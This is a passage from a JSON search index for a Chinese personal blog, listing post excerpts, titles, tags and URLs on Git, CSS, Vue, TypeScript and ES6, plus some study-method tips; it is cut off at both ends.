命令中，这两个是最让人困惑的。 它们能做很多事情，所以看起来","lvl0":"Git工具-重置揭密","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"074a14f2bf13893920e10fd697478f12","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/110.git%E5%B7%A5%E5%85%B7-%E9%87%8D%E7%BD%AE%E6%8F%AD%E5%AF%86/"},{"content":"常用Git命令清单 一般来说，日常使用只要记住下图6个命令，就可以了。但是熟练使用，恐怕要记住60～100个命令。 下面是我整理的常用 Git 命令清单","lvl0":"常用Git命令清单","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"7b14aa2f042ffa5b6f3cda6e8af41753","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/10.%E6%89%8B%E5%86%8C/00.%E5%B8%B8%E7%94%A8git%E5%91%BD%E4%BB%A4%E6%B8%85%E5%8D%95/"},{"content":"","lvl0":"《Git》学习笔记","lvl1":null,"lvl2":"摘要","objectID":"fa19ab0e9055ed5fbdd23fb0dabcea31","tags":null,"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/02.%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/33.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"content":"每当你发现很难开始执行某项任务时，可以试试将其缩减成2分钟的版本。 看一本书 → 看一页书 写一篇文章 → 写一句话 跑10公里 → 穿上跑鞋 做100次俯卧撑","lvl0":"2分钟规则","lvl1":["更多","实用技巧"],"lvl2":"摘要","objectID":"8877b3f55b23c323eb3b8337a2755892","tags":["实用技巧","文摘"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/04.%E6%9B%B4%E5%A4%9A/10.%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/01.2%E5%88%86%E9%92%9F%E8%A7%84%E5%88%99/"},{"content":"TypeScript 学习笔记 TypeScript 的类型校验是给程序员看的，在编译后不会存在TS代码。 类型注解 1 2 3 4 5 6 function fn(person: string):void{ // 参数类型是字符串，没有返回值 ///... } fn(\u0026#39;str\u0026#39;) // 如传递参数非","lvl0":"TypeScript笔记","lvl1":["前端","学习笔记"],"lvl2":"摘要","objectID":"d3d6ac025a1bf38c662598b2d3702268","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/02.%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/35.typescript%E7%AC%94%E8%AE%B0/"},{"content":"Flex 布局教程：语法篇 http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html CSS Grid 网格布局教程 http://www.ruanyifeng.com/blog/2019/03/grid-layout-tutorial.html 只要一行代码，实现五种 CSS 经典布局 http://www.ruanyifeng.com/blog/2020/08/five-css-layouts-in-one-line.html 空间居中布局 不管容器的大小，项目总是占据中心点 并列式布局 多个项目并列","lvl0":"CSS教程和技巧收藏","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"32a2c207ea50ce715afc062eb7e514d6","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/00.css%E6%95%99%E7%A8%8B%E5%92%8C%E6%8A%80%E5%B7%A7%E6%94%B6%E8%97%8F/"},{"content":"Vuex Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。 Vuex使用过程演示 以vue-cli3新创建出来的项目为例，演示Vuex的使用过程。 创建项目: 1","lvl0":"Vuex","lvl1":["《Vue》笔记","Vuex"],"lvl2":"摘要","objectID":"1eebe6d710f30849dcc9367391ef38cd","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/10.vuex/01.vuex/"},{"content":"反向拆解让人上瘾的套路，找回自律 当你打开手机准备学习或者查个资料的时候，很有可能不知不觉的就脱离的正规\u0026hellip; 某某app发来通知：x","lvl0":"反向拆解让人上瘾的套路，找回自律","lvl1":["更多","心情杂货"],"lvl2":"摘要","objectID":"bba6dbef77ebc5d31e70e7f5006bed60","tags":["心理","自律"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/04.%E6%9B%B4%E5%A4%9A/05.%E5%BF%83%E6%83%85%E6%9D%82%E8%B4%A7/10.%E5%8F%8D%E5%90%91%E6%8B%86%E8%A7%A3%E8%AE%A9%E4%BA%BA%E4%B8%8A%E7%98%BE%E7%9A%84%E5%A5%97%E8%B7%AF%E6%89%BE%E5%9B%9E%E8%87%AA%E5%BE%8B/"},{"content":"::: center 康奈尔笔记法 思维导图法 金三角笔记法 曼陀罗九宫格笔记法 记号记录法 六色笔记法 加工笔记法 整理笔记要点1-科学标记重点 整理笔记要点2-修改不涂改","lvl0":"笔记方法","lvl1":["更多","学习"],"lvl2":"摘要","objectID":"2a6ad31380ec5bcfedfad771b128ab15","tags":["笔记方法"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/04.%E6%9B%B4%E5%A4%9A/01.%E5%AD%A6%E4%B9%A0/01.%E7%AC%94%E8%AE%B0%E6%96%B9%E6%B3%95/"},{"content":"费曼学习法，我很喜欢的一个学习方法，简单来说，就是：通过向别人清楚的解说某一件事或是写一篇浅显易懂的教程文章，来确认自己是否真正弄懂了这件事","lvl0":"费曼学习法","lvl1":["更多","学习"],"lvl2":"摘要","objectID":"5800b23cc8cbae5757fb09929c4d62b5","tags":["学习方法"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/04.%E6%9B%B4%E5%A4%9A/01.%E5%AD%A6%E4%B9%A0/00.%E8%B4%B9%E6%9B%BC%E5%AD%A6%E4%B9%A0%E6%B3%95/"},{"content":"《JavaScript高级程序设计》笔记 第1章 JavaScript简介 JavaScript诞生于1995年 一个完整的JavaScript由这","lvl0":"《JavaScript高级程序设计》笔记","lvl1":["笔记"],"lvl2":"摘要","objectID":"02fadc46acfe70e351dcbe23caf7dd9a","tags":["笔记","红宝书"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/02.%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/05.javascript%E9%AB%98%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"content":"搜索引擎相信大家经常在使用，但是有时候想搜某个信息时却搜出来一大堆不相关的（百度：你们都在看我干什么？）。下面我们来介绍几种搜索技巧，可以提","lvl0":"搜索引擎使用技巧","lvl1":["更多","学习"],"lvl2":"摘要","objectID":"63b87e187b2e14397a38bfd482055a24","tags":["搜索技巧"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/04.%E6%9B%B4%E5%A4%9A/01.%E5%AD%A6%E4%B9%A0/10.%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"content":"","lvl0":"CSS-function汇总","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"2e0f1b6e9368d88864504cc6194fd2ea","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/60.css-function%E6%B1%87%E6%80%BB/"},{"content":"个人收藏夹 大佬收藏夹 panjiachen 文档 MDN | MDN-JS标准内置对象 Web技术权威文档 现代JavaScript教程 以最新标准为基准的JS教程 ES5教程 阮一","lvl0":"网站","lvl1":null,"lvl2":"摘要","objectID":"23630607e40fc745f013a2a2c1cdc942","tags":null,"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/06.%E6%94%B6%E8%97%8F%E5%A4%B9/01.%E7%BD%91%E7%AB%99/"},{"content":"「css技巧」使用hover和attr()定制悬浮提示-demo See the Pen 【CSS：行为】使用:hover和attr()定制悬浮提示 by xugaoyi (@xugaoyi) on CodePen.","lvl0":"「css技巧」使用hover和attr()定制悬浮提示","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"f6516ab169a2354d33fac1616d21d6c5","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/50.css%E6%8A%80%E5%B7%A7%E4%BD%BF%E7%94%A8hover%E5%92%8Cattr%E5%AE%9A%E5%88%B6%E6%82%AC%E6%B5%AE%E6%8F%90%E7%A4%BA/"},{"content":"比typeof运算符更准确的类型判断 不同数据类型的Object.prototype.toString方法返回值如下。 数值：返回[object","lvl0":"比typeof运算符更准确的类型判断","lvl1":["前端","JavaScript文章"],"lvl2":"摘要","objectID":"5721f97c586f4961e9c7e9719b5910e8","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/01.javascript%E6%96%87%E7%AB%A0/100.%E6%AF%94typeof%E8%BF%90%E7%AE%97%E7%AC%A6%E6%9B%B4%E5%87%86%E7%A1%AE%E7%9A%84%E7%B1%BB%E5%9E%8B%E5%88%A4%E6%96%AD/"},{"content":"npm package.json属性详解 本文转自https://www.cnblogs.com/tzyy/p/5193811.html，作者：TZ","lvl0":"npm packageJson属性详解","lvl1":["技术","技术文档"],"lvl2":"摘要","objectID":"a9afc4f5104d3a1929eb3c74010450af","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/01.%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/10.npm-packagejson%E5%B1%9E%E6%80%A7%E8%AF%A6%E8%A7%A3/"},{"content":"vdoing主题效果图 PC端 首页 \u0026 目录页△ 文章详情页 \u0026 时间轴页△ 首页个性化大图 首页个性化大图△ 深色模式和阅读模式 深色模式△ 阅读模式△ 移动端 移","lvl0":"vdoing主题效果图","lvl1":null,"lvl2":"摘要","objectID":"d2f8fd610aeae1c00856e554f8fe3efb","tags":null,"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/04.%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/10.vdoing%E4%B8%BB%E9%A2%98%E6%95%88%E6%9E%9C%E5%9B%BE/"},{"content":"如何根据系统主题自动响应CSS深色模式 很多人喜欢选择APP或网站中的深色模式，也许他们更喜欢这样的外观，或者他们想让自己的眼睛免受疲劳。这篇","lvl0":"如何根据系统主题自动响应CSS深色模式","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"ac0a3a6c21a319266c982c9062c526f2","tags":["css"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/45.%E5%A6%82%E4%BD%95%E6%A0%B9%E6%8D%AE%E7%B3%BB%E7%BB%9F%E4%B8%BB%E9%A2%98%E8%87%AA%E5%8A%A8%E5%93%8D%E5%BA%94css%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F/"},{"content":"水平垂直居中的几种方式-案例 See the Pen 水平垂直居中的几种方式 by xugaoyi (@xugaoyi) on CodePen.","lvl0":"水平垂直居中的几种方式-案例","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"b4a132bb90f8b8347a94feb41148880b","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/40.%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E5%B1%85%E4%B8%AD%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-%E6%A1%88%E4%BE%8B/"},{"content":"GitHub加速下载项目的方法 国内在github上克隆项目总是异常的慢，据我多次克隆观察，下载速度最快就20k/s左右，特别是在克隆比较大的","lvl0":"GitHub加速下载项目的方法","lvl1":["技术","GitHub技巧"],"lvl2":"摘要","objectID":"0c608513f1de2e740669d88fabada326","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/02.github%E6%8A%80%E5%B7%A7/10.github%E5%8A%A0%E9%80%9F%E4%B8%8B%E8%BD%BD%E9%A1%B9%E7%9B%AE%E7%9A%84%E6%96%B9%E6%B3%95/"},{"content":"JS获取和修改url参数 获取url参数 1 2 3 4 5 6 7 8 9 10 11 12 /** * 获取url里的参数 * @param arg 参数名 * @returns */ function getURLString(arg) { var reg = new RegExp(\u0026#34;(^|\u0026amp;)\u0026#34; + arg + \u0026#34;=([^\u0026amp;]*)(\u0026amp;|$)\u0026#34;, \u0026#34;i\u0026#34;); var r = window.location.search.substr(1).match(reg); if (r","lvl0":"JS获取和修改url参数","lvl1":["前端","JavaScript文章"],"lvl2":"摘要","objectID":"f68bfa9f59b78488215c6889b14c2853","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/01.javascript%E6%96%87%E7%AB%A0/90.js%E8%8E%B7%E5%8F%96%E5%92%8C%E4%BF%AE%E6%94%B9url%E5%8F%82%E6%95%B0/"},{"content":"防抖与节流函数 防抖和节流的作用都是在高频事件中防止函数被多次调用，是一种性能优化的方案。 区别在于，防抖函数只会在高频事件结束后n毫秒调用一次","lvl0":"防抖与节流函数","lvl1":["前端","JavaScript文章"],"lvl2":"摘要","objectID":"a8d0d24e851e37d06b9f8e7cb6002965","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/01.javascript%E6%96%87%E7%AB%A0/80.%E9%98%B2%E6%8A%96%E4%B8%8E%E8%8A%82%E6%B5%81%E5%87%BD%E6%95%B0/"},{"content":"从box-sizing属性入手，了解盒子模型 背景 先声明一下运用的场景，假如项目布局使用的是自适应的布局方式，div给出的宽度是百分比的形式，","lvl0":"从box-sizing属性入手，了解盒子模型","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"4f202de2a32ba60e2fbc5ecccabc82a4","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/35.%E4%BB%8Ebox-sizing%E5%B1%9E%E6%80%A7%E5%85%A5%E6%89%8B%E4%BA%86%E8%A7%A3%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/"},{"content":"文字在一行或多行时超出显示省略号 一行超出显示省略 1 2 3 overflow: hidden; white-space: nowrap; text-overflow: ellipsis; :::demo [vanilla] 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;html\u0026gt; \u0026lt;div class=\u0026#34;box-42b6\u0026","lvl0":"文字在一行或多行时超出显示省略号","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"1a9b70a49b50b474347461483350bdc1","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/30.%E6%96%87%E5%AD%97%E5%9C%A8%E4%B8%80%E8%A1%8C%E6%88%96%E5%A4%9A%E8%A1%8C%E6%97%B6%E8%B6%85%E5%87%BA%E6%98%BE%E7%A4%BA%E7%9C%81%E7%95%A5%E5%8F%B7/"},{"content":"将一维数组按指定长度转为二维数组 将一维数组按指定长度转为二维数组 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function pages(arr, len) { const pages = [] arr.forEach((item, index) =\u0026gt; { const page = Math.floor(index / len) if (!pages[page]) { pages[page]","lvl0":"将一维数组按指定长度转为二维数组","lvl1":["前端","JavaScript文章"],"lvl2":"摘要","objectID":"49b2fade051101ee41ad854f414b3f2e","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/01.javascript%E6%96%87%E7%AB%A0/70.%E5%B0%86%E4%B8%80%E7%BB%B4%E6%95%B0%E7%BB%84%E6%8C%89%E6%8C%87%E5%AE%9A%E9%95%BF%E5%BA%A6%E8%BD%AC%E4%B8%BA%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/"},{"content":"「布局技巧」图片未加载前自动撑开元素高度 在移动端开发中，有一些元素是根据图片高度来自动撑开的 ，高度不能写死（如轮播图的外层元素）。在网络较慢","lvl0":"「布局技巧」图片未加载前自动撑开元素高度","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"19862049ae01b24b587d9a40c673cd66","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/20.%E5%B8%83%E5%B1%80%E6%8A%80%E5%B7%A7%E5%9B%BE%E7%89%87%E6%9C%AA%E5%8A%A0%E8%BD%BD%E5%89%8D%E8%87%AA%E5%8A%A8%E6%92%91%E5%BC%80%E5%85%83%E7%B4%A0%E9%AB%98%E5%BA%A6/"},{"content":"ES5面向对象 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 //面向对象","lvl0":"ES5面向对象","lvl1":["前端","JavaScript文章"],"lvl2":"摘要","objectID":"33cf39eb610a9a6bd046b84bea418066","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/01.javascript%E6%96%87%E7%AB%A0/03.es5%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"},{"content":"常用meta整理 \u0026lt;meta\u0026gt; 元素 概要 meta标签提供关于HTML文档的元数据。元数据不会显示在页面上，但是对于机器是可读的。它可用于浏览器（如何显示内","lvl0":"常用meta整理","lvl1":["页面","HTML"],"lvl2":"摘要","objectID":"fef8ba83235b9b87701a2fe7ae462f5b","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/10.html/10.%E5%B8%B8%E7%94%A8meta%E6%95%B4%E7%90%86/"},{"content":"Vue CLi v3.x 创建项目使用记录 官方文档 以下使用的CLi版本是 v3.11.0 vue create 运行以下命令来创建一个新项目 1 vue create hello-world 你会被提示选取一个 preset (预设)。你可以选默认的包","lvl0":"Vue CLi v3 创建项目使用记录","lvl1":["《Vue》笔记","工具"],"lvl2":"摘要","objectID":"5469b88bc2ff1dc9a86a330a27d2dc88","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/05.%E5%B7%A5%E5%85%B7/10.vue-cli-v3-%E5%88%9B%E5%BB%BA%E9%A1%B9%E7%9B%AE%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"},{"content":"Mixin混入 基础 混入 (mixin) 提供了一种非常灵活的方式，来分发 Vue 组件中的可复用功能。一个混入对象可以包含任意组件选项。当组件使用混入对象时，所有混","lvl0":"Mixin混入","lvl1":["《Vue》笔记","可复用性\u0026组合"],"lvl2":"摘要","objectID":"5675d6c46a8c3d84dc752fae40e97bfc","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/04.%E5%8F%AF%E5%A4%8D%E7%94%A8%E6%80%A7%E7%BB%84%E5%90%88/01.mixin%E6%B7%B7%E5%85%A5/"},{"content":"vue父子组件的生命周期顺序 加载渲染过程 1 父beforeCreate -\u0026gt; 父created-\u0026gt; 父beforeMount-\u0026gt; 子befo","lvl0":"vue父子组件的生命周期顺序","lvl1":["《Vue》笔记","组件"],"lvl2":"摘要","objectID":"cdddb88b1d4f40f281a84c4bb6b57d88","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/02.%E7%BB%84%E4%BB%B6/90.vue%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E9%A1%BA%E5%BA%8F/"},{"content":"vue中使用Animate.css库 自定义过渡类名 我们可以通过以下 attribute 来自定义过渡类名： enter-class enter-active-class enter-to-class (2.1.8+) leave-class leave-active-class leave-to-class (2.1.8+) 他们的优先级高于普通的类名，这对于 Vue 的","lvl0":"使用animate库","lvl1":["《Vue》笔记","过渡\u0026动画"],"lvl2":"摘要","objectID":"b3f963b293ddbbea17414c564f6c170f","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/03.%E8%BF%87%E6%B8%A1%E5%8A%A8%E7%94%BB/112.%E4%BD%BF%E7%94%A8animate%E5%BA%93/"},{"content":"动态组件与 v-once 指令 动态组件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;div id=\u0026#34;root\u0026#34;\u0026gt; \u0026lt;component :is=\u0026#34;type\u0026#34;\u0026gt;\u0026lt;/component\u0026gt; \u0026lt;!--其效果如同下面两行被注释的代码--\u0026gt;","lvl0":"动态组件与 v-once 指令","lvl1":["《Vue》笔记","组件"],"lvl2":"摘要","objectID":"346107bdbbfc8b31d334cb99110ba337","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/02.%E7%BB%84%E4%BB%B6/80.%E5%8A%A8%E6%80%81%E7%BB%84%E4%BB%B6%E4%B8%8E-v-once-%E6%8C%87%E4%BB%A4/"},{"content":"插槽slot API 插槽 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;div id=\u0026#34;root\u0026#34;\u0026gt; \u0026lt;child\u0026gt; \u0026lt;!-- 组件标签 --\u0026gt; \u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt; \u0026lt;/child\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; Vue.component(\u0026#39;child\u0026#39;, { // 子组件 template: \u0026#39;\u0026lt;div\u0026gt;\u0026lt;slot\u0026gt;\u0026lt;/slot\u0026gt;\u0026lt;/div\u0026gt;\u0026#39; }) var vm = new Vue({ el: \u0026#39;#root\u0026#39; }) \u0026lt;/script\u0026gt; 上面代码中，组件标签内的h1","lvl0":"插槽slot","lvl1":["《Vue》笔记","组件"],"lvl2":"摘要","objectID":"b7b6197a7e9176a3cbd54ac9f238a0b2","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/02.%E7%BB%84%E4%BB%B6/75.%E6%8F%92%E6%A7%BDslot/"},{"content":"非父子组件间传值 当组件的嵌套多时，非父子组件间传值就显得复杂，除了使用vuex实现之外，还可以通过Bus（或者叫 总线/发布订阅模式/观察者模","lvl0":"非父子组件传值","lvl1":["《Vue》笔记","组件"],"lvl2":"摘要","objectID":"9af4b546aa119a1d17b5adac14af00ba","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/02.%E7%BB%84%E4%BB%B6/65.%E9%9D%9E%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E4%BC%A0%E5%80%BC/"},{"content":"自定义事件 API 在组件标签v-on绑定的事件是自定义事件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;div id=\u0026#34;root\u0026#34;\u0026gt; \u0026lt;child @click=\u0026#34;handleClick\u0026#34;\u0026gt;\u0026lt;/child\u0026gt; \u0026lt;!--这里click是自定义事件--","lvl0":"自定义事件","lvl1":["《Vue》笔记","组件"],"lvl2":"摘要","objectID":"2a2ba272b0ca6620bf171ae1915a44ab","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/02.%E7%BB%84%E4%BB%B6/55.%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8B%E4%BB%B6/"},{"content":"Prop 验证 与 非 Prop 的 Attribute Prop 验证 API 子组件对父组件传递来的参数进行校验 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 Vue.component(\u0026#39;my-component\u0026#39;, { props: { // 基础的","lvl0":"Prop 验证 与 非 Prop 的 Attribute","lvl1":["《Vue》笔记","组件"],"lvl2":"摘要","objectID":"e8d6e4d4748f289e7dab3fd63aed1cda","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/02.%E7%BB%84%E4%BB%B6/52.prop-%E9%AA%8C%E8%AF%81-%E4%B8%8E-%E9%9D%9E-prop-%E7%9A%84-attribute/"},{"content":"使用组件的细节点 解析 DOM 模板时的注意事项 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;div id=\u0026#34;root\u0026#34;\u0026gt; \u0026lt;table\u0026gt; \u0026lt;tbody\u0026gt; \u0026lt;row\u0026gt;\u0026lt;/row\u0026gt; \u0026lt;row\u0026gt;\u0026lt;/row\u0026gt; \u0026lt;row\u0026gt;\u0026lt;/row\u0026gt; \u0026lt;/tbody\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; Vue.component(\u0026#39;row\u0026#39;, { template: \u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;this is a row\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39; }) var vm = new Vue({ el: \u0026#39;#root\u0026#39; }) \u0026lt;/script\u0026gt; 上面代码中","lvl0":"使用组件的细节点","lvl1":["《Vue》笔记","组件"],"lvl2":"摘要","objectID":"8ee83e4bf015cb5f6c33b9a545fc15dd","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/02.%E7%BB%84%E4%BB%B6/36.%E4%BD%BF%E7%94%A8%E7%BB%84%E4%BB%B6%E7%9A%84%E7%BB%86%E8%8A%82%E7%82%B9/"},{"content":"Mixin JavaScript 语言的设计是单一继承，即子类只能继承一个父类，不允许继承多个父类。这种设计保证了对象继承的层次结构是树状的，而不是复杂的网状结构。 但是，","lvl0":"Mixin","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"18c617bf998fc80380d4441ffa022a5c","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/32.mixin/"},{"content":"SIMD 概述 SIMD（发音/sim-dee/）是“Single Instruction/Multiple Data”的缩写，意为“单指令，多数据”。它是 JavaScript 操作 CPU 对应指令的接口，你可以看做这","lvl0":"SIMD","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"00b2c06ca500bcea958e5ce57fbecf54","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/33.simd/"},{"content":"函数式编程 JavaScript 语言从一诞生，就具有函数式编程的烙印。它将函数作为一种独立的数据类型，与其他数据类型处于完全平等的地位。在 JavaScript 语言中，你可以采用面","lvl0":"函数式编程","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"8762f513637363d90a10b8e3708c4043","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/31.%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"},{"content":"参考链接 官方文件 ECMAScript® 2015 Language Specification: ECMAScript 2015 规格 ECMAScript® 2016 Language Specification: ECMAScript 2016 规格 ECMAScript® 2017 Language Specification","lvl0":"参考链接","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"b27f5478d2416be9d8159addfb1bd1a7","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/34.%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5/"},{"content":"最新提案 本章介绍一些尚未进入标准、但很有希望的最新提案。 do 表达式 本质上，块级作用域是一个语句，将多个操作封装在一起，没有返回值。 1 2 3 4 { let","lvl0":"最新提案","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"3c9666aa67991e02d20104458762f027","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/29.%E6%9C%80%E6%96%B0%E6%8F%90%E6%A1%88/"},{"content":"装饰器 [说明] Decorator 提案经过了大幅修改，目前还没有定案，不知道语法会不会再变。下面的内容完全依据以前的提案，已经有点过时了。等待定案以后，需要完","lvl0":"装饰器","lvl1":["《ES6 